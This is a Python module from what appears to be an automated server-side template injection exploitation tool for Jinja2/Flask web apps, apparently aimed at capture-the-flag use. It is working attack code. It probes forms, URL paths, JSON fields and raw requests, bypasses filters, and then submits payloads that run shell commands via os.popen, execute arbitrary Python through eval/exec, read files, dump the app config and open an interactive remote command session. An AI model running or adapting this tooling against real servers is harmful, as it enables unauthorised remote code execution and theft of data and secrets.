import re
import base64
import time
from pprint import pformat
import dataclasses
import logging
import re
import base64
from typing import Union, Optional, Dict, Any, Tuple, List
from enum import Enum

from rich.markup import escape as rich_escape

from .requester import HTTPRequester, TCPRequester
from .submitter import Submitter, FormSubmitter, PathSubmitter, JsonSubmitter, TCPSubmitter, ExtraParamAndDataCustomizable
from .cracker import FullPayloadGen, EvalArgsModePayloadGen, Cracker, guess_python_version, guess_is_flask, STRING
from functools import partial
from .const import RENDER_ERROR_KEYWORDS, GETFLAG_CODE_EVAL, ITEM, ATTRIBUTE, FLASK_CONTEXT_VAR, EVAL, CONFIG, OS_POPEN_READ
from .pbar import pbar_manager
from .form import Form, get_form
from .options import Options
from .const import PythonVersion, TemplateEnvironment, FindFlag
from .interact import interact


logger = logging.getLogger(__name__)


class RunFailed(Exception):
    """用于通知main和unit test运行失败的exception"""


def parse_getflag_info(html: str) -> Union[List[str], None]:
    flag_re = re.compile(rb"[a-zA-Z0-9-_]{1,10}\{\S{2,100\}}")
    result_b64 = re.search(r"start([a-zA-Z0-9+/=]+?)stop", html)
    if not result_b64:
        logger.warning("Getflag failed, we cannot find anything from this HTML...")
        print(html)
        return None
    try:
        result = base64.b64decode(result_b64.group(1))
        return [b.decode() for b in flag_re.findall(result)]
    except Exception:
        return None


def do_submit_cmdexec(
    cmd: str,
    submitter: Submitter,
    full_payload_gen_like: Union[FullPayloadGen, EvalArgsModePayloadGen],
) -> str:
    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
    如果cmd以@开头，则将其作为fenjing内部命令解析

    内部命令如下：
    - get-config: 获得当前的config
    - eval: 让目标python进程执行eval，解析命令后面的部分

    Args:
        cmd (str): payload对应的命令
        submitter (Submitter): 实际发送请求的submitter
        full_payload_gen_like (Union[FullPayloadGen, EvalArgsModePayloadGen]):
            生成payload的FullPayloadGen

    Returns:
        str: 回显
    """
    payload, will_print = None, None
    is_getflag_requested = False  # 用户是否用@findflag一键梭flag
    # 解析命令
    if cmd[0] == "@":
        cmd = cmd[1:]
        if cmd.startswith("get-config"):
            payload, will_print = full_payload_gen_like.generate(CONFIG)
        elif cmd.startswith("findflag"):
            if not isinstance(submitter, ExtraParamAndDataCustomizable):
                logger.warning(
                    "@findflag is [red bold]not supported[/] for this",
                )
                return ""
            is_getflag_requested = True
            submitter.set_extra_param("eval_this", GETFLAG_CODE_EVAL)
            payload, will_print = full_payload_gen_like.generate(
                EVAL,
                (
                    ITEM,
                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "values"),
                    "eval_this",
                ),
            )
        elif cmd.startswith("eval"):
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, cmd[4:].strip())
            )
        elif cmd.startswith("ls"):
            cmd = cmd.strip()
            if len(cmd) == 2:  # ls
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, "__import__('os').listdir()")
                )
            else:  # ls xxx
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})")
                )
        elif cmd.startswith("cat"):
            filepath = cmd[3:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"open({repr(filepath)}, 'r').read()")
            )
        elif cmd.startswith("exec"):
            statements = cmd[4:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"exec({repr(statements)})")
            )
        else:
            logger.info(
                "Please check your command",
                extra={"markup": False, "highlighter": None},
            )
            return ""
    else:
        payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
    # 使用payload
    if payload is None:
        logger.warning(
            "[red]Failed[/] generating payload.",
        )
        if isinstance(submitter, ExtraParamAndDataCustomizable):
            submitter.unset_extra_param("eval_this")
        return ""
    logger.info(
        "Submit payload [blue]%s[/]",
        rich_escape(payload),
    )
    if not will_print:
        logger.warning(
            "Payload generator says that this payload "
            "[red]won't print[/] command execution result.",
        )
    result = submitter.submit(payload)
    assert result is not None
    if is_getflag_requested:
        flag_data = parse_getflag_info(result.text)
        if isinstance(submitter, ExtraParamAndDataCustomizable):
            submitter.unset_extra_param("eval_this")
        if flag_data:
            return pformat(flag_data).strip()
        return "GETFLAG_FAILED"
    return result.text


class AttackType(Enum):
    FORM = "form"
    FORM_EVAL_ARGS = "form_eval_args"
    PATH = "path"
    JSON = "json"
    SCAN = "scan"
    REQUEST = "request"


@dataclasses.dataclass
class FormCrackContext:
    url: str
    form: Form
    requester: HTTPRequester
    options: Options
    tamper_cmd: Optional[str] = None
    method: str = "POST"
    inputs: Optional[list] = None


@dataclasses.dataclass
class FormEvalArgsContext:
    url: str
    form: Form
    requester: HTTPRequester
    options: Options
    tamper_cmd: Optional[str] = None
    method: str = "POST"
    inputs: Optional[list] = None


@dataclasses.dataclass
class PathCrackContext:
    url: str
    requester: HTTPRequester
    options: Options
    tamper_cmd: Optional[str] = None


@dataclasses.dataclass
class JsonCrackContext:
    url: str
    method: str
    json_data: str
    key: str
    requester: HTTPRequester
    options: Options
    tamper_cmd: Optional[str] = None


@dataclasses.dataclass
class ScanContext:
    url: str
    requester: HTTPRequester
    options: Options
    tamper_cmd: Optional[str] = None


@dataclasses.dataclass
class RequestCrackContext:
    host: str
    port: int
    request_file: str
    requester: TCPRequester
    options: Options
    tamper_cmd: Optional[str] = None
    toreplace: bytes = b"PAYLOAD"
    ssl: bool = False
    urlencode_payload: bool = True
    raw: bool = False
    retry_times: int = 5
    update_content_length: bool = True


JobContext = Union[
    FormCrackContext,
    FormEvalArgsContext,
    PathCrackContext,
    JsonCrackContext,
    ScanContext,
    RequestCrackContext,
]


class Job:
    def __init__(self, context: JobContext):
        self.context = context
        self.payload_generator: Optional[Union[FullPayloadGen, EvalArgsModePayloadGen]] = None
        self.submitter: Optional[Submitter] = None

    def do_crack_pre(self) -> bool:
        if isinstance(self.context, FormCrackContext):
            return self._do_form_crack_pre()
        elif isinstance(self.context, FormEvalArgsContext):
            return self._do_form_eval_args_pre()
        elif isinstance(self.context, PathCrackContext):
            return self._do_path_crack_pre()
        elif isinstance(self.context, JsonCrackContext):
            return self._do_json_crack_pre()
        elif isinstance(self.context, ScanContext):
            return self._do_scan_pre()
        elif isinstance(self.context, RequestCrackContext):
            return self._do_request_crack_pre()
        else:
            raise ValueError(f"Unknown context type: {type(self.context)}")

    def _do_form_crack_pre(self) -> bool:
        from typing import cast
        ctx = cast(FormCrackContext, self.context)
        python_version, python_subversion = (
            guess_python_version(ctx.url, ctx.requester)
            if ctx.options.python_version == PythonVersion.UNKNOWN
            else (ctx.options.python_version, None)
        )
        for input_field in ctx.form["inputs"]:
            submitter = FormSubmitter(
                ctx.url,
                ctx.form,
                input_field,
                ctx.requester,
            )
            environment = ctx.options.environment
            if ctx.options.environment == TemplateEnvironment.JINJA2:
                environment = (
                    TemplateEnvironment.FLASK
                    if guess_is_flask(submitter)
                    else TemplateEnvironment.JINJA2
                )
            if ctx.tamper_cmd:
                from .submitter import shell_tamperer
                tamperer = shell_tamperer(ctx.tamper_cmd)
                submitter.add_tamperer(tamperer)
            cracker = Cracker(
                submitter=submitter,
                options=dataclasses.replace(
                    ctx.options,
                    python_version=python_version,
                    python_subversion=python_subversion,
                    environment=environment,
                ),
            )
            if not cracker.has_respond():
                continue
            full_payload_gen = cracker.crack()
            if full_payload_gen:
                self.payload_generator = full_payload_gen
                self.submitter = submitter
                return True
        return False

    def _do_form_eval_args_pre(self) -> bool:
        from typing import cast
        ctx = cast(FormEvalArgsContext, self.context)
        python_version, python_subversion = (
            guess_python_version(ctx.url, ctx.requester)
            if ctx.options.python_version == PythonVersion.UNKNOWN
            else (ctx.options.python_version, None)
        )
        for input_field in ctx.form["inputs"]:
            submitter = FormSubmitter(
                ctx.url,
                ctx.form,
                input_field,
                ctx.requester,
            )
            environment = ctx.options.environment
            if ctx.options.environment == TemplateEnvironment.JINJA2:
                environment = (
                    TemplateEnvironment.FLASK
                    if guess_is_flask(submitter)
                    else TemplateEnvironment.JINJA2
                )
            if ctx.tamper_cmd:
                from .submitter import shell_tamperer
                tamperer = shell_tamperer(ctx.tamper_cmd)
                submitter.add_tamperer(tamperer)
            cracker = Cracker(
                submitter=submitter,
                options=dataclasses.replace(
                    ctx.options,
                    python_version=python_version,
                    python_subversion=python_subversion,
                    environment=environment,
                ),
            )
            if not cracker.has_respond():
                continue
            result = cracker.crack_eval_args()
            if result:
                submitter2, evalargs_payload_gen = result
                self.payload_generator = evalargs_payload_gen
                self.submitter = submitter2
                return True
        return False

    def _do_path_crack_pre(self) -> bool:
        from typing import cast
        ctx = cast(PathCrackContext, self.context)
        python_version, python_subversion = (
            guess_python_version(ctx.url, ctx.requester)
            if ctx.options.python_version == PythonVersion.UNKNOWN
            else (ctx.options.python_version, None)
        )
        submitter = PathSubmitter(url=ctx.url, requester=ctx.requester)
        if ctx.tamper_cmd:
            from .submitter import shell_tamperer
            tamperer = shell_tamperer(ctx.tamper_cmd)
            submitter.add_tamperer(tamperer)
        environment = ctx.options.environment
        if ctx.options.environment == TemplateEnvironment.JINJA2:
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )
        cracker = Cracker(
            submitter=submitter,
            options=dataclasses.replace(
                ctx.options,
                environment=environment,
                python_version=python_version,
                python_subversion=python_subversion,
            ),
        )
        if not cracker.has_respond():
            return False
        full_payload_gen = cracker.crack()
        if full_payload_gen:
            self.payload_generator = full_payload_gen
            self.submitter = submitter
            return True
        return False

    def _do_json_crack_pre(self) -> bool:
        from typing import cast
        ctx = cast(JsonCrackContext, self.context)
        python_version, python_subversion = (
            guess_python_version(ctx.url, ctx.requester)
            if ctx.options.python_version == PythonVersion.UNKNOWN
            else (ctx.options.python_version, None)
        )
        import json
        json_obj = json.loads(ctx.json_data)
        submitter = JsonSubmitter(
            ctx.url,
            ctx.method,
            json_obj,
            ctx.key,
            ctx.requester,
        )
        if ctx.tamper_cmd:
            from .submitter import shell_tamperer
            tamperer = shell_tamperer(ctx.tamper_cmd)
            submitter.add_tamperer(tamperer)
        environment = ctx.options.environment
        if ctx.options.environment == TemplateEnvironment.JINJA2:
            environment = (
                TemplateEnvironment.FLASK
                if guess_is_flask(submitter)
                else TemplateEnvironment.JINJA2
            )
        cracker = Cracker(
            submitter=submitter,
            options=dataclasses.replace(
                ctx.options,
                environment=environment,
                python_version=python_version,
                python_subversion=python_subversion,
            ),
        )
        if not cracker.has_respond():
            return False
        full_payload_gen = cracker.crack()
        if full_payload_gen:
            self.payload_generator = full_payload_gen
            self.submitter = submitter
            return True
        return False

    def _do_scan_pre(self) -> bool:
        from typing import cast
        ctx = cast(ScanContext, self.context)
        from .scan_url import yield_form
        from .cli import is_form_has_response
        url_forms = [
            (page_url, form)
            for i, (page_url, forms) in enumerate(yield_form(ctx.requester, ctx.url))
            for form in forms
            if i < 100
        ]
        url_forms.sort(
            key=lambda item: is_form_has_response(
                url=item[0], form=item[1], requester=ctx.requester, tamper_cmd=ctx.tamper_cmd
            ),
            reverse=True,
        )
        for page_url, form in url_forms:
            form_ctx = FormCrackContext(
                url=page_url,
                form=form,
                requester=ctx.requester,
                options=ctx.options,
                tamper_cmd=ctx.tamper_cmd,
            )
            job = Job(form_ctx)
            if job._do_form_crack_pre():
                self.payload_generator = job.payload_generator
                self.submitter = job.submitter
                return True
        return False

    def _do_request_crack_pre(self) -> bool:
        from typing import cast
        ctx = cast(RequestCrackContext, self.context)
        from pathlib import Path
        from .requester import check_tail, fix_tail, check_line_break, fix_line_break
        request_filepath = Path(ctx.request_file)
        if not request_filepath.is_file():
            return False
        request_pattern = request_filepath.read_bytes()
        if not ctx.raw and not check_tail(request_pattern):
            request_pattern = fix_tail(request_pattern)
        if not ctx.raw and not check_line_break(request_pattern):
            request_pattern = fix_line_break(request_pattern)
        submitter = TCPSubmitter(
            requester=ctx.requester,
            pattern=request_pattern,
            toreplace=ctx.toreplace,
            urlencode_payload=ctx.urlencode_payload,
            enable_update_content_length=ctx.update_content_length,
        )
        if ctx.tamper_cmd:
            from .submitter import shell_tamperer
            tamperer = shell_tamperer(ctx.tamper_cmd)
            submitter.add_tamperer(tamperer)
        cracker = Cracker(submitter=submitter, options=ctx.options)
        if not cracker.has_respond():
            return False
        full_payload_gen = cracker.crack()
        if full_payload_gen:
            self.payload_generator = full_payload_gen
            self.submitter = submitter
            return True
        return False

    def do_crack(self, exec_cmd: Optional[str] = None, find_flag: FindFlag = FindFlag.AUTO):
        from .interact import interact
        from functools import partial
        if self.payload_generator is None or self.submitter is None:
            raise ValueError("Must call do_crack_pre() first")
        cmd_exec_func = partial(
            do_submit_cmdexec,
            submitter=self.submitter,
            full_payload_gen_like=self.payload_generator,
        )
        if find_flag != FindFlag.DISABLED:
            if isinstance(self.submitter, ExtraParamAndDataCustomizable):
                getflag_result = cmd_exec_func("@findflag")
                if getflag_result and getflag_result != "GETFLAG_FAILED":
                    pass
        if exec_cmd:
            result = cmd_exec_func(exec_cmd)
            print(result)
        else:
            interact(cmd_exec_func)

    def execute_command(self, command: str) -> str:
        if self.payload_generator is None or self.submitter is None:
            raise ValueError("Job not initialized, call do_crack_pre() first")
        return do_submit_cmdexec(
            command,
            self.submitter,
            self.payload_generator,
        )


def do_crack_form_pre(
    url: str,
    form: Form,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个表单并获得用于生成payload的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    if "127.0.0.1" in url or "localhost" in url:
        logger.info(
            "Try out our new feature [cyan bold]crack-keywords[/] with "
            '[cyan bold]python -m fenjing crack-keywords -k ./app.py -c "ls"[/]!',
            extra={"markup": True, "highlighter": None},
        )
    context = FormCrackContext(
        url=url,
        form=form,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if job.do_crack_pre():
        # 类型断言：对于FormCrackContext，payload_generator应该是FullPayloadGen
        from typing import cast
        full_payload_gen = cast(FullPayloadGen, job.payload_generator)
        submitter = cast(Submitter, job.submitter)
        return full_payload_gen, submitter
    logger.warning(
        "[red]Didn't see any input that has response. "
        "Did you forget something like cookies?[/]",
        extra={"markup": True, "highlighter": None},
    )
    return None


def do_crack_form_eval_args_pre(
    url: str,
    form: Form,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
    """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交

    Args:
        url (str): 目标url
        form (Form): 目标表格
        requester (HTTPRequester): 提交请求的requester
        options (Options): 攻击使用的选项
        tamper_cmd (Union[str, None]): tamper命令

    Returns:
        Union[Tuple[Submitter, EvalArgsModePayloadGen], None]: 攻击结果
    """
    context = FormEvalArgsContext(
        url=url,
        form=form,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if job.do_crack_pre():
        from typing import cast
        submitter = cast(Submitter, job.submitter)
        evalargs_payload_gen = cast(EvalArgsModePayloadGen, job.payload_generator)
        return submitter, evalargs_payload_gen
    logger.warning(
        "[red]Didn't see any input that has response. "
        "Did you forget something like cookies? [/]",
        extra={"markup": True, "highlighter": None},
    )
    return None


def do_crack_path_pre(
    url: str,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个路径并获得payload生成器

    Args:
        url (str): 目标url
        requester (HTTPRequester): 发送请求的类
        options (Options): 攻击使用的选项
        tamper_cmd (Union[str, None]): tamper命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    context = PathCrackContext(
        url=url,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if job.do_crack_pre():
        from typing import cast
        full_payload_gen = cast(FullPayloadGen, job.payload_generator)
        submitter = cast(Submitter, job.submitter)
        return full_payload_gen, submitter
    return None


def do_crack_json_pre(
    url: str,
    method: str,
    json_data: str,
    key: str,
    requester: HTTPRequester,
    options: Options,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个表单并获得用于生成payload的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    context = JsonCrackContext(
        url=url,
        method=method,
        json_data=json_data,
        key=key,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if job.do_crack_pre():
        from typing import cast
        full_payload_gen = cast(FullPayloadGen, job.payload_generator)
        submitter = cast(Submitter, job.submitter)
        return full_payload_gen, submitter
    return None

def do_crack_request_pre(
    submitter: TCPSubmitter,
    options: Options,
) -> Union[FullPayloadGen, None]:
    """根据指定的请求文件进行攻击并获得结果

    Args:
        submitter (TCPSubmitter): 发送payload的类
        options (Options): 攻击使用的选项

    Returns:
        Union[FullPayloadGen, None]: 攻击结果
    """
    with pbar_manager.progress:
        cracker = Cracker(submitter=submitter, options=options)
        if not cracker.has_respond():
            return None
        full_payload_gen = cracker.crack()
    if full_payload_gen is None:
        return None
    return full_payload_gen


def do_crack(
    full_payload_gen: FullPayloadGen,
    submitter: Submitter,
    exec_cmd: Union[str, None],
    find_flag: FindFlag,
):
    """使用payload生成器攻击对应的表单参数/路径

    Args:
        full_payload_gen (FullPayloadGen): payload生成器
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=full_payload_gen,
    )
    is_find_flag_enabled = find_flag == FindFlag.ENABLED
    if find_flag == FindFlag.AUTO:
        test_string = repr('"generate_me": os.popen("cat /f* ./f*").read(),')
        payload, will_print = full_payload_gen.generate(STRING, test_string)
        if payload is None or not will_print:
            is_find_flag_enabled = False
        elif len(payload) >= len(test_string) * 5:
            logger.info(
                "[yellow]Payload for finding flag "
                "is too long, we decide not to submit it[/]",
            )
            is_find_flag_enabled = False
        else:
            is_find_flag_enabled = True

    if isinstance(submitter, ExtraParamAndDataCustomizable) and is_find_flag_enabled:
        logger.info(
            "[yellow]Searching flags...[/]",
        )
        getflag_result = cmd_exec_func("@findflag")
        if getflag_result and getflag_result != "GETFLAG_FAILED":
            logger.info("This might be your [cyan bold]flag[/]:")
            logger.info(getflag_result)
            logger.info("No thanks.")
            time.sleep(3)
        else:
            logger.info("I cannot find flag for you... but")
            logger.info("Bypass WAF [green bold]success[/]")

    if exec_cmd:
        result = cmd_exec_func(exec_cmd)
        print(result)
        if any(keyword in result for keyword in RENDER_ERROR_KEYWORDS):
            raise RunFailed()
    else:
        interact(cmd_exec_func)


def do_crack_eval_args(
    submitter: Submitter,
    eval_args_payloadgen: EvalArgsModePayloadGen,
    exec_cmd: Union[str, None],
    find_flag: FindFlag
):
    """攻击对应的表单参数/路径，但是使用eval_args方法

    Args:
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        eval_args_payloadgen (EvalArgsModePayloadGen): EvalArgs的payload生成器
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=eval_args_payloadgen,
    )
    if find_flag != FindFlag.DISABLED:
        print(cmd_exec_func("@findflag"))
    if exec_cmd:
        print(cmd_exec_func(exec_cmd))
    else:
        interact(cmd_exec_func)
